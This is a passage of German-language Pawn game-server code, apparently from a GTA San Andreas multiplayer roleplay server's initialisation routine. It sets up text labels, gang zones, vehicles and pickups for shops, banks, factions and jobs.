	Create3DTextLabel("Zollstation SF - LS\nUm passieren zu können, gib an der Schranke /ZOLL ein.",0xFAFAFAFF,101.65186, -1272.34497, 14.31233,32.0,0);
	Create3DTextLabel("Zollstation SF - LS\nUm passieren zu können, gib an der Schranke /ZOLL ein.",0xFAFAFAFF,110.51665, -1277.13660, 14.40798,32.0,0);

	//
	Create3DTextLabel("Benutze /buygun bzw /buyarmor\n um hier einzukaufen!",COLOR_YELLOW,290.2523,-106.7863,1001.5156,20,0);
	Create3DTextLabel("Benutze /buygun bzw /buyarmor\n um hier einzukaufen!",COLOR_YELLOW,295.4237,-38.1667,1001.5156,20,0);
	Create3DTextLabel("Benutze /buygun bzw /buyarmor\n um hier einzukaufen!",COLOR_YELLOW,307.9703,-140.8076,999.6016,20,0);
	Create3DTextLabel("Benutze /buygun bzw /buyarmor\n um hier einzukaufen!",COLOR_YELLOW,312.2781,-165.1863,999.6010,20,0);




    new string[MAX_PLAYER_NAME];
    new string1[MAX_PLAYER_NAME];



	Triaden = GangZoneCreate(-2155.196, -175.2063, -2012.277, -21.35266);
	Vagos = GangZoneCreate(2394.94, -1101.544, 2585.082, -971.2684);
	Ballas = GangZoneCreate(1885.36, -1223.924, 2105.925, -1089.701);
	Grove = GangZoneCreate(2318.883, -1784.503, 2577.476, -1591.064);
//	Aztecas = GangZoneCreate(1924.6472, -2191.9539, 1680.0643, -1994.2634);
	Yakuza = GangZoneCreate(-2814.1357, -194.1384, -2658.1360, -405.0181);//Yakuza
 	Russianm = GangZoneCreate(2406.349, -2183.225, 2581.279, -2052.949);//RM
	Gangfights = GangZoneCreate(560.538, -724.0283, 875.8406, -362.0141);
	LCN = GangZoneCreate(1558.4685, -1877.4822, 1683.8849, -1770.5396);




	LoadFraks();
	 printf("1");
	LoadOrg();
	 printf("2");
	LoadTanke();
	 printf("3");
	LoadRangNames();
	 printf("4");
	LoadProperty();
	 printf("5");
	LoadBizz();
	 printf("6");
	LoadSBizz();
	 printf("7");
	LoadGangZones();
	 printf("8");
	LoadBoxer();
	 printf("9");
    LoadBlacklist();
	 printf("10");
	LoadStuff();
	 printf("11");
	LoadFrakMats();
	 printf("12");
	LoadFrakDrugs();
	 printf("13");
	LoadIRC();
	 printf("14");
	LoadPapers();
	 printf("15");
	LoadFraktionsKassen();
	 printf("16");
 	LoadORGAutos();
	 printf("17 - ORG Autos geladen!");
	SaveFraktionsKassen();
	IRCInfo[0][iPlayers] = 0; IRCInfo[1][iPlayers] = 0; IRCInfo[2][iPlayers] = 0;
	IRCInfo[3][iPlayers] = 0; IRCInfo[4][iPlayers] = 0; IRCInfo[5][iPlayers] = 0;
	IRCInfo[6][iPlayers] = 0; IRCInfo[7][iPlayers] = 0; IRCInfo[8][iPlayers] = 0;
	IRCInfo[9][iPlayers] = 0;
	News[hTaken1] = 0; News[hTaken2] = 0; News[hTaken3] = 0; News[hTaken4] = 0; News[hTaken5] = 0;
	format(string, sizeof(string), "Nothing");
	strmid(News[hAdd1], string, 0, strlen(string), 255);
	strmid(News[hAdd2], string, 0, strlen(string), 255);
	strmid(News[hAdd3], string, 0, strlen(string), 255);
	strmid(News[hAdd4], string, 0, strlen(string), 255);
	strmid(News[hAdd5], string, 0, strlen(string), 255);
	format(string1, sizeof(string1), "Niemand");
	strmid(News[hContact1], string1, 0, strlen(string1), 255);
	strmid(News[hContact2], string1, 0, strlen(string1), 255);
	strmid(News[hContact3], string1, 0, strlen(string1), 255);
	strmid(News[hContact4], string1, 0, strlen(string1), 255);
	strmid(News[hContact5], string1, 0, strlen(string1), 255);
	PlayerHaul[Truck[0]][pCapasity] = 100;
	PlayerHaul[Truck[1]][pCapasity] = 100;
	PlayerHaul[Truck[2]][pCapasity] = 100;
	PlayerHaul[Truck[3]][pCapasity] = 50;
	PlayerHaul[Truck[4]][pCapasity] = 50;
	PlayerHaul[Truck[5]][pCapasity] = 50;
	format(string, sizeof(string), "%s", VERSION);
	SetGameModeText(string);//
	format(objstore, sizeof(objstore), "MOLE: Ich habe nichts, bitte komme später nochmal.");
	format(cbjstore, sizeof(cbjstore), "HQ: Es ist nicht in deiner Nähe.");
	gettime(ghour, gminute, gsecond);
	FixHour(ghour);
	ghour = shifthour;
//	if(!realtime)
//	{
	SetWorldTime(wtime);
//	}
//	SetPDistance(10);
	AllowInteriorWeapons(1);
//	AllowAdminTeleport(1);
	EnableStuntBonusForAll(false);
    ShowPlayerMarkers(1);
	DisableInteriorEnterExits();

	for(new i = 0; i < GetMaxPlayers(); i++)
	{
		//Tutorial
		PlayerInfo[i][LetterboxTop] = TextDrawCreate(1.000000,1.000000,"~w~Einleitung~n~~n~~n~~n~~n~~n~~n~");
		TextDrawUseBox(PlayerInfo[i][LetterboxTop],1);
		TextDrawBoxColor(PlayerInfo[i][LetterboxTop],0x000000ff);
		TextDrawTextSize(PlayerInfo[i][LetterboxTop],642.000000,20.000000);
		TextDrawAlignment(PlayerInfo[i][LetterboxTop],0);
		TextDrawBackgroundColor(PlayerInfo[i][LetterboxTop],0x000000ff);
		TextDrawFont(PlayerInfo[i][LetterboxTop],2);
		TextDrawLetterSize(PlayerInfo[i][LetterboxTop],0.400000,1.400000);
		TextDrawColor(PlayerInfo[i][LetterboxTop],0xffffffff);
		TextDrawSetOutline(PlayerInfo[i][LetterboxTop],1);
		TextDrawSetProportional(PlayerInfo[i][LetterboxTop],1);
		TextDrawSetShadow(PlayerInfo[i][LetterboxTop],1);

		PlayerInfo[i][LetterboxBottom] = TextDrawCreate(2.000000,336.000000,"~n~~w~_~n~~n~~n~~n~~n~~n~~n~~n~");
		TextDrawUseBox(PlayerInfo[i][LetterboxBottom],1);
		TextDrawBoxColor(PlayerInfo[i][LetterboxBottom],0x000000ff);
		TextDrawTextSize(PlayerInfo[i][LetterboxBottom],638.000000,3.000000);
		TextDrawAlignment(PlayerInfo[i][LetterboxBottom],0);
		TextDrawBackgroundColor(PlayerInfo[i][LetterboxBottom],0x00ffff00);
		TextDrawFont(PlayerInfo[i][LetterboxBottom],2);//,1.200000,2.000000);
		TextDrawLetterSize(PlayerInfo[i][LetterboxBottom],0.400000,1.300000);
		TextDrawColor(PlayerInfo[i][LetterboxBottom],0xffffffff);
		TextDrawSetOutline(PlayerInfo[i][LetterboxBottom],1);
		TextDrawSetProportional(PlayerInfo[i][LetterboxBottom],1);
		TextDrawSetShadow(PlayerInfo[i][LetterboxBottom],5);
	}
	// CreatedCars check
	for(new i = 0; i < sizeof(CreatedCars); i++)
	{
	    CreatedCars[i] = 0;
	}
	// Player Class's
	for(new i = 0; i <= sizeof(Peds)-1; i++)
	{
		AddPlayerClass(Peds[i][0],1958.3783,1343.1572,1100.3746,269.1425,-1,-1,-1,-1,-1,-1);
	}


    //========== BANK ENTER =============//
    Create3DTextLabel("GTA-City Reallife Bank\nEigentum der Regierung", COLOR_BUYED, 2446.8069,2376.3457,12.1635,15.0,0);
	Create3DTextLabel("GTA-City Reallife Bank\nEigentum der Regierung", COLOR_BUYED, -2055.7607,454.7605,35.1719,15.0,0);
	Create3DTextLabel("GTA-City Reallife Bank\nEigentum der Regierung", COLOR_BUYED, 1462.473632,-1011.350830,27.843799,15.0,0);
//	Create3DTextLabel("KFZ Zulassungsstelle\n Benutze die Taste Enter um hineinzugelangen", COLOR_BUYED, 1209.8247,-1749.9943,13.5937,20.0,0);


    // Kartbahn
    KartFahrzeug[0]=AddStaticVehicle(571,2299.0623,-2334.4465,12.8306,221.3730,3,3); //
    KartFahrzeug[1]=AddStaticVehicle(571,2296.6753,-2336.5481,12.8308,221.3730,3,3); //
    KartFahrzeug[2]=AddStaticVehicle(571,2290.7703,-2341.7483,12.8310,221.3730,3,3); //
    KartFahrzeug[3]=AddStaticVehicle(571,2288.3591,-2343.8708,12.8311,221.3730,3,3); //
    KartFahrzeug[4]=AddStaticVehicle(571,2283.4814,-2348.1672,12.8313,221.3730,3,3); //
    KartFahrzeug[5]=AddStaticVehicle(571,2280.5938,-2350.7100,12.8314,221.3730,3,3); //


    Zug[0]=AddStaticVehicle(538, 1393.7891, 2632.2659, 11.9919, 269.7145, 1, 1);
    Zug[1]=AddStaticVehicle(538, 1393.7891, 2632.2659, 11.9919, 269.7145, 1, 1);
    Zug[2]=AddStaticVehicle(538, 1393.7891, 2632.2659, 11.9919, 269.7145, 1, 1);
    Zug[3]=AddStaticVehicle(538, 1393.7891, 2632.2659, 11.9919, 269.7145, 1, 1);
    Zug[4]=AddStaticVehicle(538, 1393.7891, 2632.2659, 11.9919, 269.7145, 1, 1);


	MuellFahrzeug[0] = AddStaticVehicle(408,1649.4597,-1896.3094,14.1088,355.8829,1,1); // Müllman
	MuellFahrzeug[1] = AddStaticVehicle(408,1654.5302,-1896.3311,14.0901,356.3140,1,1); // Müllman
	MuellFahrzeug[2] = AddStaticVehicle(408,1659.5114,-1896.6703,14.1082,357.9327,1,1); // Müllman
	MuellFahrzeug[3] = AddStaticVehicle(408,1664.6948,-1896.7588,14.1014,359.0865,1,1); // Müllman
	MuellFahrzeug[4] = AddStaticVehicle(408,1669.6338,-1896.9474,14.0891,1.0387,1,1); // Müllman



	FarmFahrzeug[0] = AddStaticVehicle(532,-20.2785,93.0773,4.0884,110.6576,0,0); // Farmer
	FarmFahrzeug[1] = AddStaticVehicle(532,-56.4781,85.6339,4.0949,248.4950,0,0); // Farmer
	FarmFahrzeug[2] = AddStaticVehicle(532,-59.5366,76.8864,4.0930,248.6035,0,0); // Farmer
	FarmFahrzeug[3] = AddStaticVehicle(532,-50.7428,62.5898,4.1000,337.6453,0,0); // Farmer
	FarmFahrzeug[4] = AddStaticVehicle(532,-59.9553,65.6170,4.0961,338.4916,0,0); // Farmer
	FarmFahrzeug[5] = AddStaticVehicle(532,-51.1265,94.7157,4.1324,242.1129,0,0); // Farmer

    //PRODCARS
	AddStaticVehicle(456,2794.9788,-2417.9172,13.8211,91.9586,0,0); // truck1
	AddStaticVehicle(456,2781.0115,-2418.0171,13.8093,89.6792,0,0); // truck2
	AddStaticVehicle(456,2792.4055,-2455.8757,13.8061,89.1830,0,0); // truck3
	AddStaticVehicle(456,2780.3369,-2455.6748,13.8089,89.6262,0,0); // truck4


	PilotenVehs[0] = AddStaticVehicle(511,1989.3309,-2249.7639,14.9342,90.0630,223,1); // BMX - LS Pipe
	PilotenVehs[1] = AddStaticVehicle(511,1989.7368,-2315.8713,14.9325,89.9998,223,1); // BMX - LS Pipe
	PilotenVehs[2] = AddStaticVehicle(511,1989.5795,-2382.7070,14.8769,90.0000,223,1); // BMX - LS Pipe
	PilotenVehs[3] = AddStaticVehicle(553,1922.5193,-2247.8062,14.8171,181.1788,223,1); // BMX - LS Pipe
	PilotenVehs[4] = AddStaticVehicle(553,1869.3947,-2287.7400,14.8175,271.6720,223,1); // BMX - LS Pipe
	PilotenVehs[5] = AddStaticVehicle(577,1901.0507,-2390.1147,13.4598,91.2035,223,1); // BMX - LS Pipe
	PilotenVehs[6] = AddStaticVehicle(511,1725.7780,-2416.6379,14.8745,178.3980,223,1); // BMX - LS Pipe
	PilotenVehs[7] = AddStaticVehicle(511,1725.0946,-2442.1692,14.8706,178.5629,223,1); // BMX - LS Pipe

	BMXEN[1] = AddStaticVehicle(481,1923.0358,-1438.4713,13.1201,225.2164,1,1); // BMX - LS Pipe
	BMXEN[2] = AddStaticVehicle(481,1925.9242,-1438.0210,13.1261,222.1919,2,2); // BMX - LS Pipe
	BMXEN[3] = AddStaticVehicle(481,1928.6671,-1437.1633,13.1297,228.4984,3,3); // BMX - LS Pipe
	BMXEN[4] = AddStaticVehicle(481,1919.7489,-1414.5242,13.1361,320.3998,4,4); // BMX - LS Pipe
	BMXEN[5] = AddStaticVehicle(481,1923.1971,-1414.6820,13.1463,313.7765,6,6); // BMX - LS Pipe
	BMXEN[6] = AddStaticVehicle(481,1926.6367,-1414.5822,13.1399,314.0963,7,7); // BMX - LS Pipe
	BMXEN[7] = AddStaticVehicle(481,1947.1016,-1362.3192,18.0928,90.4319,6,6); // BMX - LS Pipe
	BMXEN[8] = AddStaticVehicle(481,1947.2954,-1366.1267,18.0930,96.7058,7,7); // BMX - LS Pipe
	BMXEN[9] = AddStaticVehicle(481,1947.3434,-1376.5751,18.0926,94.0958,4,4); // BMX - LS Pipe
	BMXEN[10] = AddStaticVehicle(481,1947.5251,-1381.2081,18.0860,100.1993,7,7); // BMX - LS Pipe
	BMXEN[11] = AddStaticVehicle(481,1872.2836,-1370.2439,13.0505,178.0831,6,6); // BMX - LS Pipe
	BMXEN[12] = AddStaticVehicle(481,1883.3069,-1369.7556,13.0857,179.3563,6,6); // BMX - LS Pipe
	BMXEN[13] = AddStaticVehicle(481,1887.9427,-1369.0032,13.0815,184.9156,6,6); // BMX - LS Pipe
	BMXEN[14] = AddStaticVehicle(481,1867.9071,-1369.2559,13.0226,178.8100,6,6); // BMX - LS Pipe



	BusVehs[1] = AddStaticVehicle(431, 1114.3392, -1695.9183, 13.4810, 0.0000,5,5); // Bus unternehmen
	BusVehs[2] = AddStaticVehicle(431, 1119.0664, -1695.9047, 13.4810, 0.0000,5,5); // Bus unternehmen
	BusVehs[3] = AddStaticVehicle(431, 1124.1445, -1695.8135, 13.4810, 0.0000,5,5); // Bus unternehmen
	BusVehs[4] = AddStaticVehicle(431, 1129.0529, -1695.7567, 13.4810, 0.0000,5,5); // Bus unternehmen
	BusVehs[5] = AddStaticVehicle(431, 1133.8461, -1695.6615, 13.4810, 0.0000,5,5); // Bus unternehmen
	BusVehs[6] = AddStaticVehicle(431, 1068.8759, -1696.1580, 13.4810, 0.0000,5,5); // Bus unternehmen
	BusVehs[7] = AddStaticVehicle(431, 1063.8109, -1696.1304, 13.4810, 0.0000,5,5); // Bus unternehmen
	BusVehs[8] = AddStaticVehicle(431, 1059.0366, -1696.1273, 13.4810, 0.0000,5,5); // Bus unternehmen
	BusVehs[9] = AddStaticVehicle(431, 1054.1514, -1696.0615, 13.4810, 0.0000,5,5); // Bus unternehmen
	BusVehs[10] = AddStaticVehicle(431, 1054.0428, -1668.7555, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[11] = AddStaticVehicle(431, 1058.8143, -1668.7747, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[12] = AddStaticVehicle(431, 1064.1339, -1668.9119, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[13] = AddStaticVehicle(431, 1069.0748, -1668.8279, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[14] = AddStaticVehicle(431, 1074.1897, -1668.8748, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[15] = AddStaticVehicle(431, 1079.1248, -1668.9346, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[16] = AddStaticVehicle(431, 1084.1510, -1668.8805, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[17] = AddStaticVehicle(431, 1088.8970, -1668.9270, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[18] = AddStaticVehicle(431, 1094.0385, -1668.8048, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[19] = AddStaticVehicle(431, 1098.8997, -1668.6892, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[20] = AddStaticVehicle(431, 1103.9810, -1668.8047, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[21] = AddStaticVehicle(431, 1108.8230, -1668.9624, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[22] = AddStaticVehicle(431, 1114.0223, -1668.8378, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[23] = AddStaticVehicle(431, 1118.8167, -1668.8573, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[24] = AddStaticVehicle(431, 1124.1580, -1668.8431, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[24] = AddStaticVehicle(431, 1129.0182, -1668.7828, 13.4810, 180.0000,5,5); // Bus unternehmen
	BusVehs[26] = AddStaticVehicle(431, 1133.7213, -1668.8073, 13.4810, 180.0000,5,5); // Bus unternehmen




    fixpoints = CreatePickup(3096,14,1599.7242,-1627.1826,14.0003);
    fixpoints2 = CreatePickup(3096,14,-1628.9167,657.6143,7.8713);
    fixpoints3 = CreatePickup(3096,14,2312.1646,2494.5967,3.8113);
    fixpoints4 = CreatePickup(3096,14,884.4870,-1189.7336,17.4459);



	CreatePickup(1310,1,1971.8423,-2205.5608,13.5469,0);   // fallschirm springen


    CreatePickup(1279,1,-46.2156,-2491.5188,36.6484,0);  // terror bombenplatz


    /*ocmd:pilot(playerid,params[])
{
	new choosed[MAX_PLAYER_NAME];
    if(sscanf(params, "s", choosed))
    {
		SendClientMessage(playerid, -1, "|__________________ Pilot Options  __________________|");
		SendClientMessage(playerid, -1, "Benutze: /pilot [name]");
		SendClientMessage(playerid, -1, "Commands: find, duty");
		SendClientMessage(playerid, -1, "|________________________________________________|");
		return 1;
	}
	if(strcmp(choosed,"duty",true) == 0)
	{


*/




	AddStaticPickup(1581, 1, 1735.5508,-1114.3833,24.0859); //Duty Feuerwehr




	AddStaticPickup(1581, 1, 1952.8041,-2178.1680,13.5469); //FLYLICENSE
	AddStaticPickup(1581, 1, -242.1245,-235.2225,2.4297); //LKWLICENSE
	AddStaticPickup(1239, 1, 240.9979,112.8959,1003.2188); //KLINGEL
	AddStaticPickup(1239, 2, 288.7460,169.3510,1007.1719); //SWATEXIT
//	AddStaticPickup(1550, 2, 2155.1436,1623.8749,993.6882); //rob pickup
	AddStaticPickup(1239, 2, 2316.6191,-12.6046,26.7422); //BANK
	AddStaticPickup(1239, 2, 2316.4468,-10.1002,26.7422); //BANK
	AddStaticPickup(1239, 2, 2316.1729,-7.1389,26.7422); //BANK
	AddStaticPickup(1239, 2, 1414.7958,-988.8644,1639.7843); //BANK REIN
	AddStaticPickup(1239, 2, 2308.8831,-2.0025,26.7422); //Kredit
	AddStaticPickup(1239, 3, 489.5197,-1511.6572,20.5045); //ZIVIHILFE
	AddStaticPickup(1239, 3, 1000.2737,-1104.4468,23.4015); //Neeeeon
	AddStaticPickup(1239, 3, 290.2523,-106.7863,1001.5156); //SHOP
	AddStaticPickup(1239, 3, 295.4237,-38.1667,1001.5156); //SHOP
	AddStaticPickup(1239, 2, 2179.6458,-2256.0725,14.7734); //Rifasenter
	AddStaticPickup(1239, 2, 1835.9020,-1682.5295,13.3704); //Alambhra "i"
	AddStaticPickup(1239, 2, 195.5248,-228.4122,1.7786); //GANGTÜR "I"

	AddStaticPickup(1239, 2, 256.8279,69.4461,1003.6406);
	AddStaticPickup(1239, 2, 246.5717,118.1915,1003.2188);

	AddStaticPickup(1239, 0, 925.9141,-1208.2228,17.0104);



	AddStaticPickup(1239, 0, 2864.7419,1014.5103,10.7548);




	AddStaticPickup(1239, 0,325.4559,307.0085,999.1484,-1);// STADTHALLE /CREATEORG


	AddStaticPickup(1239, 0,358.9532,182.6575,1008.3828,-1);// STADTHALLE /CREATEORG


	AddStaticPickup(1239, 2,307.9703,-140.8076,999.6016,-1);// Drive in Freeze bug
	AddStaticPickup(1239, 2,312.2781,-165.1863,999.6010,-1);// Drive in Freeze bug


	AddStaticPickup(1239, 0,911.9958,-1221.7587,16.9766);// /freecar
	AddStaticPickup(1239, 2, -2810.0015,-1524.0463,140.8438); //Gangjail
	AddStaticPickup(1239, 2, 2668.9263,-2639.5989,2.1344); //BundeswehrRep2
	AddStaticPickup(1239, 2, 2758.9431,-2393.5806,13.6328); //BundeswehrRep1
	AddStaticPickup(1239, 2, 2324.6418,-1135.9731,1051.3047); //KRZ "I"
	AddStaticPickup(1239, 2, 2324.419921,-1145.568359,1050.710083); //KFZEXIT
	AddStaticPickup(1239, 2, 1209.8247,-1749.9943,13.5937); //KFZENTER
	AddStaticPickup(1239, 2, 2770.7278,-1627.9824,12.1775); //VAGOSENTER
	AddStaticPickup(1239, 2, -2029.7687,-118.9294,1035.1719); //Fahrschule Exit
	AddStaticPickup(1239, 2, 725.3910,-1450.1915,17.6953); //Fahrschule Enter
//	AddStaticPickup(1239, 23, 2805.0444,-1434.0425,40.0484); // FRAKMATS
	AddStaticPickup(1239, 23, 1017.9830,-919.3538,42.3359); // FARBE NORTH
	AddStaticPickup(1239, 23, 1911.2693,-1776.6720,13.3828); // /FARBE SOUTH
//	AddStaticPickup(1239, 23, 1207.2928,-917.7825,43.0665); // AD SF
	AddStaticPickup(1239, 23, 2173.3035,1403.3943,11.0625); // RM ENTER
	AddStaticPickup(1239, 23, -85.4636,2.1646,3.1172);//Drogenpoint
	AddStaticPickup(1239, 23, 1213.8599,-1638.5707,11.7969);//mwLIFT
	AddStaticPickup(1239, 23, 1281.1855,-1641.1213,27.3750);//mwLIFT
	AddStaticPickup(1239, 23, 992.7688,-1460.1172,13.5469);//MLIFT

	AddStaticPickup(1239, 23,1041.7180,2131.5728,10.8203);// /FARBE

	AddStaticPickup(1239, 23, 990.2078,-1461.0585,21.2656);//MLIFT
//	AddStaticPickup(1239, 23, 1647.9086,-1817.2784,13.5346); // /LENTER
//	AddStaticPickup(1239, 23, 433.7250,-83.9479,999.5547); // /raus
//	AddStaticPickup(1239, 23, 1771.4659,-1547.2609,9.9151); // /rein
	AddStaticPickup(1240, 2, 236.7048,1068.0605,1084.2059,5); // HEAL RS
	AddStaticPickup(1239, 2, 773.6705,3.1167,1000.7171); // /KAMPFSTYLES
	AddStaticPickup(1239, 23, 2548.9006,-1294.7961,1060.9844);//Triaden
	AddStaticPickup(1239, 23, -2119.5020,-178.9242,35.3203);//Triaden
	AddStaticPickup(1239, 23, 490.8359,-14.0423,1000.6797); //dance
	AddStaticPickup(1239, 23, 499.4521,-20.6484,1000.6797); //drink
	AddStaticPickup(1239, 23, 2002.8409,-2382.0603,13.5469);
	AddStaticPickup(1239, 23, 1214.4454,-904.4616,42.9208);
	AddStaticPickup(1274, 2, 448.4033,-84.3045,999.5547); //MENU DOLLAR
	AddStaticPickup(1239, 23, 1957.5536,-2183.4856,13.5469); // LS AIRPORT PRODS
//	AddStaticPickup(1239, 23, 2232.1707,-1159.8075,25.8906); // Arbeitsamt
	AddStaticPickup(1239, 23, 1123.2803,-2037.1238,69.8875); // Enter Präsi
	AddStaticPickup(1240, 2, 1292.1702,-798.5539,1089.9375, 4); // Präsi Heal
	AddStaticPickup(1240, 2, 1272.6268,-797.7535,1089.9375, 4); // SeSe Heal
	AddStaticPickup(1239, 23, 1910.2467,-2639.1057,13.5469); // Flughafen LS
	AddStaticPickup(1239, 23, -1233.6982,-88.1554,13.9228); // Flughafen SF
	AddStaticPickup(1239, 23, 1346.5087,1712.4694,10.8203); // Flughafen LV
	AddStaticPickup(1313, 2, 260.8033,102.8064,1030.2539,-1); //Enforcer interior /ausruesten
	AddStaticPickup(1313, 2, 1277.3894,-797.1385,1089.9375,-1); //Präsi interior /ausruesten
	AddStaticPickup(1239, 2, 1494.3556,1303.7893,1093.2891,-1); // FW exit + Mexit
	AddStaticPickup(1248, 2, 1564.5691,-1675.1954,61.8963,-1); // LSPD
	AddStaticPickup(1318, 2, 2323.7102,-1254.4778,22.5000,-1); // RM Aufzug Unten
	AddStaticPickup(1318, 2, 1709.5562,-1642.9690,20.2188,-1); // RM Aufzug Oben
	AddStaticPickup(1239,23,1261.1112,-785.4005,1091.9063,-1); // LCN Exit
	AddStaticPickup(1239,23,1701.3274,-1667.7771,20.2188); // RM Base Exit
	AddStaticPickup(1239,23,2334.8171,-1265.9872,27.9693); // RM Base Enter
	AddStaticPickup(1240, 2, 1812.7900,-1311.0913,120.2878,-1); //Hitman health
	AddStaticPickup(1239, 23, -1060.0887,-1205.5676,129.2188, -1); //Hitman Agency entrance
//	AddStaticPickup(1239, 23, 1825.5352,-1305.2288,120.3046, -1); //Hitman Agency exit
//	AddStaticPickup(347, 23, 2149.2600,-1802.2012,16.1548, -1); //Hitman Agency Waffen abhol Ort
//	AddStaticPickup(1239,23,2804.8872,-1437.9536,40.0447); // Schwarzmarkt "i"
	AddStaticPickup(1239, 2, 799.1068,-1629.4493,12.9548); //DRIVEIN
	AddStaticPickup(1239, 2, 811.4277,-1616.1138,13.5469); //BSSENTER
	AddStaticPickup(1239, 2, 457.304748,-88.428497,999.554687); //BSSEXIT
	AddStaticPickup(1239, 23, 1388.7091,-993.8844,5651.8315); //Aufsprengen
	AddStaticPickup(1275, 2, 223.4126,185.4840,1003.0313,-1); //Unifo/rm LSPD
	AddStaticPickup(1254, 2, 201.8244,1865.1124,13.1406,-1); //BW EQUIP
	AddStaticPickup(1247, 2, 217.5230,184.4352,1003.0313,-1); //Duty LSPD
//	AddStaticPickup(1239, 2, 312.6207,-1518.2163,24.9219,-1); // LCn Garage I
	AddStaticPickup(1239, 2, 490.7159,-1519.1860,20.3347,-1);//guide
	AddStaticPickup(1275, 2, 219.1845,109.5997,1003.2188,-1); //Uniform SFPD
	AddStaticPickup(1247, 2, 227.6519,111.8072,1003.2188,-1); //Duty SFPD
    AddStaticPickup(1239, 2, 478.3927,-1527.7627,20.0114,-1); //Startbonus icon
	AddStaticPickup(1239, 2, -314.1795,1774.4463,43.6406,-1); //Terrorbase
    AddStaticPickup(1239, 2, 1220.0658,-1813.3065,16.5938,-1); ///fenter
   	AddStaticPickup(1239, 2, 1369.0005,-1279.7201,13.5469,-1); //Waffenladen rein
    AddStaticPickup(1318, 2, 1462.4657,-1011.3002,26.8438,-1); //Bank
    AddStaticPickup(1239, 2, 489.5197,-1511.6572,20.5045,-1); //Neuling icon
	AddStaticPickup(1239,23,1424.1346,-1003.0747,1639.7843,-1);
	AddStaticPickup(1239,23,-2055.7607,454.7605,35.1719,-1);//SF bank
	AddStaticPickup(1239,23,1369.5651,-1647.7888,13.3828,-1);
	AddStaticPickup(1239,23,-2720.3408,-318.6624,7.8438,-1);// Triaden
	AddStaticPickup(1239,23,2638.0803,1849.8354,11.0234,-1); // yakuza ok
	AddStaticPickup(1318,23,-341.8454,4054.2869,30.8625,-1);//Ammunation LS
	AddStaticPickup(1318,23,1014.4359,-15.6008,-2.0652,-1);//Ammunation LS
//	AddStaticPickup(1318,23,1526.2836,-1677.6589,6.2188,-1);//Ammunation LS
	AddStaticPickup(1318,23,215.5705,124.9554,1003.2188,-1);//Ammunation LS
	AddStaticPickup(1318,23,1560.3859,-1635.9836,13.5580,-1);//Ammunation LS
	AddStaticPickup(1318,23,1564.9357,-1666.0231,28.3956,-1);//Ammunation LS
	AddStaticPickup(1239,23,2570.0479,2288.9055,11.0700,-1); // LCN

	AddStaticPickup(1239,0,1023.1495,-1091.6942,23.8349,-1);// /buycar

	AddStaticPickup(1239,23,140.3315,1366.7438,1083.8594,-1); // LCN
	//AddStaticPickup(1239,23,231.2063,184.1050,1003.0313,-1);
	AddStaticPickup(1239,23,2268.2002,2448.2603,3.5313,-1);
	AddStaticPickup(1318,23,215.1161,120.9743,999.0156,-1); // DAS // Weißer Pfeil
	AddStaticPickup(1239,23,-1605.3094,711.6002,13.8672,-1);
	AddStaticPickup(1239,23,363.3297,173.7336,1008.3828,-1);
//	AddStaticPickup(1239,23,-1606.3243,673.1292,-5.2422,-1);
	AddStaticPickup(1239,23,2336.9761,2458.5974,14.9688,-1);
	AddStaticPickup(1239,23,246.5619,87.3850,1003.6406,-1);
	AddStaticPickup(1239,23,2307.4392,2039.5839,10.8203,-1);
//	AddStaticPickup(1239,23,1172.5886,-1323.3914,15.4031,-1);
	AddStaticPickup(1239,23,-329.7009,1536.8140,76.6117,-1);
	AddStaticPickup(1239,23,-792.86,1627.51,27.16,-1);//Ammunation LS /buywaffenschein
	AddStaticPickup(1239,23,330.96,-40.48,2.23,-1);//Ammunation LS /buywaffenschein
	AddStaticPickup(1239,23,1364.03,-1266.51,13.55,-1);//Ammunation LS /buywaffenschein
	AddStaticPickup(1318,23,2462.4351,80.6730,26.4564,-1);//Hitman Enter
	AddStaticPickup(1239,23,-1280.7585,2719.8538,50.0625,-1);

	// Weißer Pfeil (permanent)
//	AddStaticPickup(1318,0,999.6990,-919.9576,42.3281,-1);
	AddStaticPickup(1318,0,1201.4347,-918.8720,43.1031,-1);
//	AddStaticPickup(1318,0,1352.3802,-1758.4081,13.5078,-1);
//	AddStaticPickup(1318,0,2104.4939,-1806.4132,13.5547,-1);
	AddStaticPickup(1318,0,2244.6790,-1664.9142,15.4766,-1);
	AddStaticPickup(1318,0,2229.5657,-1721.8525,13.5670,-1);
//	AddStaticPickup(1318,0,1200.4178,-918.4980,43.1127,-1);// BSN LS
	AddStaticPickup(1318,0,1164.4379,-1329.8876,31.4799,-1);
	AddStaticPickup(1318,0,1147.5365,-1342.6619,13.6357,-1);
//	AddStaticPickup(1318,0,-2026.6454,-102.0622,35.1641,-1);
	AddStaticPickup(1318,0,231.2622,182.2081,1003.0313,-1);// LVPD Exit
//	AddStaticPickup(1318,0,861.0403,-1240.8751,14.7578,-1);
//	AddStaticPickup(1318,0,928.1182,-1353.0314,13.3438,-1);
	AddStaticPickup(1318,0,314.0237,-1516.1582,24.9219,-1);// San News Neu


	AddStaticPickup(1318,0,-12.9655,-2519.8782,36.8200,-1);



	// Arrest
	AddStaticPickup(1314,0,1564.6588,-1694.1836,5.8906,-1);
	AddStaticPickup(1314,0,-1589.3329,716.3265,-5.2422,-1);
	AddStaticPickup(1314,0,2281.5049,2431.0366,3.2734,-1);


	AddStaticPickup(1239,0,252.8250,1780.5929,701.0859,-1);// San News neu


    AddStaticPickup(1239,2,2446.8069,2376.3457,12.1635,-1);
//    AddStaticPickup(1274, 2, 1771.5807,-1895.8499,13.5545,-1);
//    AddStaticPickup(1239, 2, 2149.6309,-1805.6676,16.1474,-1); //HSkin
 //   AddStaticPickup(1239, 2, 1102.1628,-1263.3516,21.5469,-1); //Ballas /armor
